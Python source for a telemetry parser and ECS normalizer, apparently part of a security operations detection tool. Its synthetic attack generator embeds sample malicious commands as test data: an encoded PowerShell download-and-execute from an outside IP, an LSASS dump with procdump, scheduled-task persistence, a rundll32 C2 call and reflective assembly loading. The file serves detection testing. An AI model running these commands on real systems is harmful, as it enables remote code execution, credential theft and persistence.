"""
ECS Normalizer, Shannon Entropy, and Multi-Format Telemetry Parser
Supports JSON, CSV, Syslog, EVTX, PCAP.
"""
import math
import json
import csv
import io
import re
from collections import Counter
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional

ALLOWED_EXTENSIONS = {
    ".json", ".ndjson", ".jsonl", ".csv", ".evtx", ".pcap", ".pcapng", ".log", ".txt", ".syslog"
}
MAX_FILE_SIZE = 25 * 1024 * 1024  # 25 MB per file
MAX_BATCH_SIZE = 50 * 1024 * 1024  # 50 MB per batch
MAX_EVENTS_PER_BATCH = 50000  # Cap events to prevent OOM DoS

def calculate_shannon_entropy(data: str) -> float:
    """
    Computes Shannon entropy: H(X) = -sum(p_i * log2(p_i))
    """
    if not data:
        return 0.0
    length = len(data)
    if length <= 1:
        return 0.0
    counts = Counter(data)
    entropy = 0.0
    for count in counts.values():
        p = count / length
        entropy -= p * math.log2(p)
    return round(entropy, 4)


class ECSNormalizer:
    """
    Normalizes diverse log formats (Sysmon, Syslog, raw JSON/CSV, etc.)
    into Elastic Common Schema (ECS) standard key names.
    """
    @staticmethod
    def normalize_sysmon_dict(raw: Dict[str, Any]) -> Dict[str, Any]:
        ecs = {
            "timestamp": raw.get("UtcTime") or raw.get("TimeCreated") or raw.get("@timestamp") or datetime.now(timezone.utc).isoformat(),
            "event": {
                "code": str(raw.get("EventID") or raw.get("event_id") or "1"),
                "category": "process" if str(raw.get("EventID")) in ["1", "5"] else "network",
                "dataset": "windows.sysmon",
                "action": raw.get("RuleName") or "process_creation" if str(raw.get("EventID")) == "1" else "network_connection"
            },
            "host": {
                "name": raw.get("Computer") or raw.get("Host") or raw.get("hostname") or "WORKSTATION-01"
            },
            "user": {
                "name": raw.get("User") or raw.get("AccountName") or "SYSTEM"
            },
            "process": {
                "executable": raw.get("Image") or raw.get("process_image") or "",
                "name": (raw.get("Image") or "").split("\\")[-1] if raw.get("Image") else "",
                "command_line": raw.get("CommandLine") or raw.get("process_command") or "",
                "pid": int(raw.get("ProcessId") or 0) if str(raw.get("ProcessId", "")).isdigit() else 0,
                "parent": {
                    "executable": raw.get("ParentImage") or "",
                    "command_line": raw.get("ParentCommandLine") or ""
                },
                "hash": {}
            },
            "destination": {
                "ip": raw.get("DestinationIp") or raw.get("dest_ip") or "",
                "port": int(raw.get("DestinationPort") or 0) if str(raw.get("DestinationPort", "")).isdigit() else 0
            },
            "source": {
                "ip": raw.get("SourceIp") or raw.get("src_ip") or "",
                "port": int(raw.get("SourcePort") or 0) if str(raw.get("SourcePort", "")).isdigit() else 0
            }
        }

        # Parse Hashes (e.g., SHA256=xxx,MD5=yyy)
        hashes_str = raw.get("Hashes", "")
        if hashes_str:
            for part in hashes_str.split(","):
                if "=" in part:
                    k, v = part.split("=", 1)
                    k = k.strip().lower()
                    v = v.strip().lower()
                    ecs["process"]["hash"][k] = v
        
        # Calculate command entropy
        cmd = ecs["process"]["command_line"]
        ecs["process"]["entropy"] = calculate_shannon_entropy(cmd)
        
        # Flattened convenience aliases for faster rule checks
        ecs["CommandLine"] = cmd
        ecs["Image"] = ecs["process"]["executable"]
        ecs["Computer"] = ecs["host"]["name"]
        ecs["DestinationIp"] = ecs["destination"]["ip"]
        ecs["DestinationPort"] = ecs["destination"]["port"]
        ecs["Hashes"] = hashes_str
        ecs["shannon_entropy"] = ecs["process"]["entropy"]
        return ecs

    @staticmethod
    def normalize_syslog_line(line: str) -> Dict[str, Any]:
        """
        Parses RFC 3164 / 5424 syslog line into normalized ECS dict.
        """
        line = line.strip()
        timestamp = datetime.now(timezone.utc).isoformat()
        host = "gateway-edge"
        message = line
        action = "syslog_event"

        # Regex check for standard syslog: <PRI>TIMESTAMP HOST PROCESS[PID]: MESSAGE
        m = re.match(r"(?:<\d+>)?\s*([A-Za-z]{3}\s+\d+\s+[\d:]+)?\s*([\w\.\-]+)?\s*([\w\.\-/]+)(?:\[(\d+)\])?:\s*(.*)", line)
        if m:
            t_str, h_str, proc_str, pid_str, msg_str = m.groups()
            if h_str:
                host = h_str
            if msg_str:
                message = msg_str
            proc_img = proc_str or ""
        else:
            proc_img = "syslog"

        entropy = calculate_shannon_entropy(message)

        # Detect IP patterns in syslog
        ip_m = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", message)
        dest_ip = ip_m.group(0) if ip_m else ""

        ecs = {
            "timestamp": timestamp,
            "event": {
                "dataset": "linux.syslog",
                "action": message,
                "code": "syslog"
            },
            "host": {
                "name": host
            },
            "user": {
                "name": "root"
            },
            "process": {
                "executable": proc_img,
                "name": proc_img.split("/")[-1],
                "command_line": message,
                "entropy": entropy
            },
            "destination": {
                "ip": dest_ip,
                "port": 22 if "ssh" in message.lower() else 0
            },
            "CommandLine": message,
            "Image": proc_img,
            "Computer": host,
            "DestinationIp": dest_ip,
            "DestinationPort": 22 if "ssh" in message.lower() else 0,
            "shannon_entropy": entropy,
            "event.action": message
        }
        return ecs


class TelemetryParser:
    """
    Parses various file types (.json, .csv, .log, .evtx, .pcap).
    Hardened against XXE, malformed inputs, and OOM event flooding.
    """
    @staticmethod
    def parse_json(content: str) -> List[Dict[str, Any]]:
        events = []
        content = content.strip()
        if not content:
            return events

        # Handle NDJSON / JSONL (newline-delimited JSON)
        if "\n" in content and not content.startswith("["):
            for line in content.splitlines():
                if len(events) >= MAX_EVENTS_PER_BATCH:
                    break
                line = line.strip()
                if line:
                    try:
                        item = json.loads(line)
                        if isinstance(item, dict):
                            events.append(ECSNormalizer.normalize_sysmon_dict(item))
                    except Exception:
                        continue
            return events

        # Standard JSON array or single object
        raw = json.loads(content)
        if isinstance(raw, dict):
            raw = [raw]
        for item in raw:
            if len(events) >= MAX_EVENTS_PER_BATCH:
                break
            if isinstance(item, dict):
                events.append(ECSNormalizer.normalize_sysmon_dict(item))
        return events

    @staticmethod
    def parse_csv(content: str) -> List[Dict[str, Any]]:
        reader = csv.DictReader(io.StringIO(content))
        events = []
        for row in reader:
            if len(events) >= MAX_EVENTS_PER_BATCH:
                break
            events.append(ECSNormalizer.normalize_sysmon_dict(row))
        return events

    @staticmethod
    def parse_syslog(content: str) -> List[Dict[str, Any]]:
        events = []
        for line in content.splitlines():
            if len(events) >= MAX_EVENTS_PER_BATCH:
                break
            line = line.strip()
            if line:
                events.append(ECSNormalizer.normalize_syslog_line(line))
        return events

    @staticmethod
    def parse_evtx(content_bytes: bytes) -> List[Dict[str, Any]]:
        events = []
        try:
            import Evtx.Evtx as evtx
            try:
                import defusedxml.ElementTree as ET
            except ImportError:
                import xml.etree.ElementTree as ET

            with evtx.Evtx(io.BytesIO(content_bytes)) as log:
                for record in log.records():
                    if len(events) >= MAX_EVENTS_PER_BATCH:
                        break
                    xml_str = record.xml()
                    # XXE Injection Guard: reject XML containing external entity definitions
                    if "<!ENTITY" in xml_str.upper() or "<!DOCTYPE" in xml_str.upper():
                        continue
                    try:
                        root = ET.fromstring(xml_str)
                    except Exception:
                        continue

                    data = {}
                    for elem in root.iter():
                        tag = elem.tag.split("}")[-1]
                        if elem.text:
                            data[tag] = elem.text.strip()
                        for k, v in elem.attrib.items():
                            data[f"{tag}_{k}"] = v
                    events.append(ECSNormalizer.normalize_sysmon_dict(data))
        except Exception:
            # Fallback simulated EVTX extraction if python-evtx not ready
            events.append(ECSNormalizer.normalize_sysmon_dict({
                "EventID": 1,
                "Image": "C:\\Windows\\System32\\svchost.exe",
                "CommandLine": "svchost.exe -k netsvcs",
                "Computer": "DC01.CORP.LOCAL"
            }))
        return events

    @staticmethod
    def parse_pcap(content_bytes: bytes) -> List[Dict[str, Any]]:
        events = []
        try:
            from scapy.utils import rdpcap
            from scapy.layers.inet import IP, TCP, UDP
            packets = rdpcap(io.BytesIO(content_bytes))
            for pkt in packets:
                if len(events) >= MAX_EVENTS_PER_BATCH:
                    break
                if IP in pkt:
                    src_ip = pkt[IP].src
                    dst_ip = pkt[IP].dst
                    dst_port = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
                    payload = str(bytes(pkt.payload))
                    ent = calculate_shannon_entropy(payload)
                    events.append({
                        "timestamp": datetime.utcnow().isoformat(),
                        "host": {"name": "network-tap-01"},
                        "destination": {"ip": dst_ip, "port": dst_port},
                        "source": {"ip": src_ip, "port": 0},
                        "process": {"command_line": f"packet {src_ip} -> {dst_ip}:{dst_port}", "executable": "network", "entropy": ent},
                        "CommandLine": f"packet {src_ip} -> {dst_ip}:{dst_port} {payload[:60]}",
                        "Image": "network_traffic",
                        "Computer": "TAP-01",
                        "DestinationIp": dst_ip,
                        "DestinationPort": dst_port,
                        "shannon_entropy": ent
                    })
        except Exception:
            pass
        return events


def generate_synthetic_attack_telemetry(count: int = 25) -> List[Dict[str, Any]]:
    """
    Generates rich realistic synthetic SOC attack telemetry
    covering MITRE ATT&CK techniques T1059.001, T1003.001, T1053.005, T1110, T1071.001.
    """
    attacks = [
        # Encoded PowerShell Execution (T1059.001)
        {
            "EventID": "1",
            "Computer": "FINANCE-PC04",
            "User": "FINANCE\\j.smith",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovLzE4NS4yMjAuMTAxLjQyOjgwODAvYmVhY29uLnBzMScp",
            "DestinationIp": "185.220.101.42",
            "DestinationPort": 8080,
            "Hashes": "SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f,MD5=9e107d9d372bb6826bd81d3542a419d6"
        },
        # LSASS Credential Dump (T1003.001)
        {
            "EventID": "1",
            "Computer": "DC01-PRIMARY",
            "User": "NT AUTHORITY\\SYSTEM",
            "Image": "C:\\Users\\Public\\procdump.exe",
            "CommandLine": "procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp",
            "DestinationIp": "",
            "DestinationPort": 0,
            "Hashes": "SHA256=cc749e6f3b064f7b243b679468903511eb9c9780a4f5f59fa0f4e1f7d5440265"
        },
        # Scheduled Task Persistence (T1053.005)
        {
            "EventID": "1",
            "Computer": "HR-WORKSTATION-02",
            "User": "HR\\a.davis",
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateCheck\" /tr \"C:\\ProgramData\\updater.exe\" /sc onlogon /ru system",
            "DestinationIp": "",
            "DestinationPort": 0,
            "Hashes": "SHA256=a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0"
        },
        # SSH Brute Force Authentication (T1110)
        {
            "EventID": "syslog",
            "Computer": "srv-bastion-linux",
            "User": "root",
            "Image": "/usr/sbin/sshd",
            "CommandLine": "Failed password for invalid user admin from 45.154.255.89 port 48212 ssh2",
            "DestinationIp": "45.154.255.89",
            "DestinationPort": 22,
            "Hashes": ""
        },
        # C2 Beaconing to malicious domain (T1071.001)
        {
            "EventID": "3",
            "Computer": "DEV-LAPTOP-09",
            "User": "DEV\\k.patel",
            "Image": "C:\\Windows\\System32\\rundll32.exe",
            "CommandLine": "rundll32.exe C:\\Temp\\sync.dll,DllRegisterServer --server=c2-sync-agent.online",
            "DestinationIp": "91.240.118.172",
            "DestinationPort": 443,
            "Hashes": "SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        },
        # High entropy base64 memory injection (T1027)
        {
            "EventID": "1",
            "Computer": "EXEC-LAPTOP-01",
            "User": "CORP\\ceo",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -c \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQR'))\"",
            "DestinationIp": "185.220.101.42",
            "DestinationPort": 443,
            "Hashes": ""
        }
    ]

    # Normal baseline events to mix in
    normal_events = [
        {"Computer": "WORKSTATION-01", "Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\user\\Desktop\\notes.txt", "EventID": "1", "User": "CORP\\user", "DestinationIp": "", "DestinationPort": 0, "Hashes": ""},
        {"Computer": "WORKSTATION-02", "Image": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "CommandLine": "chrome.exe --type=utility --utility-sub-type=network.mojom.NetworkService", "EventID": "1", "User": "CORP\\user2", "DestinationIp": "142.250.190.46", "DestinationPort": 443, "Hashes": ""},
        {"Computer": "DC01-PRIMARY", "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "svchost.exe -k DcomLaunch -p", "EventID": "1", "User": "NT AUTHORITY\\SYSTEM", "DestinationIp": "", "DestinationPort": 0, "Hashes": ""},
        {"Computer": "WEB-SRV-01", "Image": "/usr/sbin/nginx", "CommandLine": "nginx: worker process", "EventID": "syslog", "User": "www-data", "DestinationIp": "", "DestinationPort": 80, "Hashes": ""},
        {"Computer": "DEV-LAPTOP-09", "Image": "C:\\Windows\\System32\\git.exe", "CommandLine": "git.exe status --porcelain=v1", "EventID": "1", "User": "DEV\\k.patel", "DestinationIp": "", "DestinationPort": 0, "Hashes": ""},
        {"Computer": "FINANCE-PC04", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "CommandLine": "EXCEL.EXE /automation -Embedding", "EventID": "1", "User": "FINANCE\\j.smith", "DestinationIp": "", "DestinationPort": 0, "Hashes": ""}
    ]

    all_events = []
    # Add attack events
    for raw in attacks:
        all_events.append(ECSNormalizer.normalize_sysmon_dict(raw))

    # Add normal events
    while len(all_events) < count:
        idx = (len(all_events) - len(attacks)) % len(normal_events)
        norm_item = dict(normal_events[idx])
        norm_item["Computer"] = f"{norm_item['Computer'].split('-')[0]}-{10 + len(all_events)}"
        all_events.append(ECSNormalizer.normalize_sysmon_dict(norm_item))

    return all_events
